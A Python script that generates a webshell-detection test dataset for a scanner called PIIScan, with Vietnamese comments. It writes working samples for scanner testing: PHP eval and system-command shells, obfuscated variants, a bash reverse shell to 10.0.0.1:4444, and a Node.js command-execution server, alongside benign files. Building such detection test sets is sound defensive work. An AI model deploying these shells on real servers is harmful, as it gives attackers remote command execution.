#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tạo bộ test dataset cho PIIScan Server Pro.

Cấu trúc tạo ra:
    test_dataset/
        malicious/   <- webshell/backdoor mà PIIScan PHẢI bắt (true positive)
        benign/      <- code an toàn mà PIIScan KHÔNG nên báo (đo false positive)

Cách dùng:
    python3 make_test_dataset.py
    python3 piiscan.py --path test_dataset/malicious --output-html report_malicious.html --output-csv report_malicious.csv
    python3 piiscan.py --path test_dataset/benign    --output-html report_benign.html    --output-csv report_benign.csv
"""
import os

BASE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "test_dataset")
MAL = os.path.join(BASE, "malicious")
BENIGN = os.path.join(BASE, "benign")

os.makedirs(MAL, exist_ok=True)
os.makedirs(BENIGN, exist_ok=True)

# ==========================================================
# 1. FILE MALICIOUS — webshell / backdoor thật (đúng format PIIScan quét)
# ==========================================================

MALICIOUS_FILES = {
    # --- PHP webshell kinh điển ---
    "php_simple_eval.php": """<?php
/* Webshell đơn giản nhất - eval backdoor */
@eval($_POST['cmd']);
?>
""",

    "php_system_exec.php": """<?php
// System command execution via POST
$c = $_REQUEST['c'];
system($c);
exec($c);
passthru($c);
shell_exec($c);
?>
""",

    "php_base64_encoded.php": """<?php
// base64_decode ẩn payload
$a = base64_decode('c2VoZWxsX2V4ZWM=');
@eval($a($_POST['x']));
assert($_REQUEST['x']);
?>
""",

    "php_c99shell.php": """<?php
/* c99shell - webshell phổ biến */
$auth_pass = "root";
if(isset($_POST['c99'])) { eval(base64_decode($_POST['c99'])); }
echo system($_GET['cmd']);
?>
""",

    "php_r57shell.php": """<?php
// r57shell backdoor
if(md5($_POST['pass']) == "1a1dc91c907325c69271ddf0c944bc72") {
    @passthru($_POST['cmd']);
}
$sock = fsockopen($_GET['host'], $_GET['port']);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
""",

    "php_reverse_shell.php": """<?php
// reverse_shell - kết nối ngược
$ip = '10.0.0.1';
$port = 4444;
$sh = shell_exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1"');
?>
""",

    # --- Python backdoor ---
    "python_backdoor.py": """import os
import subprocess

# Backdoor nhan lenh tu command line
cmd = input("Nhap lenh: ")
os.system(cmd)
subprocess.Popen(cmd, shell=True)
""",

    # --- Node.js backdoor ---
    "js_backdoor.js": """const { exec } = require('child_process');
const http = require('http');

http.createServer((req, res) => {
    const cmd = req.url.slice(1);
    exec(cmd, (err, stdout) => {
        res.end(stdout);
    });
}).listen(3000);
""",

    # --- PHP shell ẩn trong file hợp lệ (obfuscated) ---
    "php_upload_backdoor.php": """<?php
// Gia dinh la file upload anh nhung thuc ra la shell
if (isset($_FILES['file'])) {
    $target = "uploads/" . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
}
$code = "sys"."tem";
$code($_GET['x']);
?>
""",
}

for name, content in MALICIOUS_FILES.items():
    with open(os.path.join(MAL, name), "w", encoding="utf-8") as f:
        f.write(content)

# ==========================================================
# 2. FILE BENIGN — code an toàn (không nên bị báo là mã độc)
# ==========================================================

BENIGN_FILES = {
    # PHP an toàn: chỉ kết nối DB, xử lý form, không có hàm nguy hiểm
    "php_db_connect.php": """<?php
// Ket noi co so du lieu MySQL an toan
$host = 'localhost';
$dbname = 'website';
$user = 'webapp';
$pass = 'password';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);
$result = $stmt->fetch();
?>
""",

    "php_contact_form.php": """<?php
// Form lien he binh thuong
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = htmlspecialchars($_POST['name']);
    $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
    $message = htmlspecialchars($_POST['message']);

    if ($email) {
        // Gui email
        $to = "admin@example.com";
        $subject = "Lien he tu $name";
        mail($to, $subject, $message);
        echo "Cam on ban da lien he!";
    }
}
?>
""",

    "php_calculator.php": """<?php
// Tinh toan don gian, khong co thuc thi lenh he thong
$a = intval($_GET['a']);
$b = intval($_GET['b']);
$op = $_GET['op'];

switch ($op) {
    case 'add': $result = $a + $b; break;
    case 'sub': $result = $a - $b; break;
    case 'mul': $result = $a * $b; break;
    case 'div': $result = ($b != 0) ? $a / $b : "Loi chia 0"; break;
    default: $result = "Phep toan khong hop le";
}
echo "Ket qua: $result";
?>
""",

    "python_utils.py": """# Cac ham tien ich an toan
def tinh_trung_binh(danh_sach):
    if not danh_sach:
        return 0
    return sum(danh_sach) / len(danh_sach)


def doc_file(duong_dan):
    with open(duong_dan, 'r', encoding='utf-8') as f:
        return f.read()


# Xu ly du lieu nguoi dung an toan
def chuan_hoa_ten(ten):
    return ten.strip().title()
""",

    "js_frontend.js": """// Xu ly giao dien nguoi dung an toan
function validateForm() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (email.length === 0) {
        alert('Vui long nhap email');
        return false;
    }

    if (password.length < 6) {
        alert('Mat khau phai it nhat 6 ky tu');
        return false;
    }

    return true;
}

fetch('/api/contact', {
    method: 'POST',
    body: JSON.stringify({ name: 'An', message: 'Xin chao' })
});
""",

    "js_math.js": """// Thu vien toan hoc
function add(a, b) { return a + b; }
function multiply(a, b) { return a * b; }
function squareRoot(x) { return Math.sqrt(x); }
module.exports = { add, multiply, squareRoot };
""",

    "config_env.txt": """# Cau hinh ung dung (vi du)
APP_NAME=MyWebApp
APP_ENV=production
DB_HOST=localhost
DB_PORT=3306
LOG_LEVEL=info
""",
}

for name, content in BENIGN_FILES.items():
    with open(os.path.join(BENIGN, name), "w", encoding="utf-8") as f:
        f.write(content)

# ==========================================================
# 3. Tổng kết
# ==========================================================
total_mal = len(MALICIOUS_FILES)
total_ben = len(BENIGN_FILES)
print("=" * 60)
print("DA TAO XONG BO TEST DATASET")
print("=" * 60)
print(f"Thư mục: {BASE}")
print(f"  malicious/ : {total_mal} file webshell/backdoor (PIIScan phải bắt)")
print(f"  benign/    : {total_ben} file an toàn (PIIScan không nên báo)")
print()
print("Danh sách file malicious:")
for n in sorted(MALICIOUS_FILES):
    print(f"  -> {n}")
print()
print("Danh sách file benign:")
for n in sorted(BENIGN_FILES):
    print(f"  -> {n}")
print()
print("CÁCH CHẠY THỬ:")
print("  python3 piiscan.py --path test_dataset/malicious --output-html report_malicious.html --output-csv report_malicious.csv")
print("  python3 piiscan.py --path test_dataset/benign    --output-html report_benign.html    --output-csv report_benign.csv")
print("=" * 60)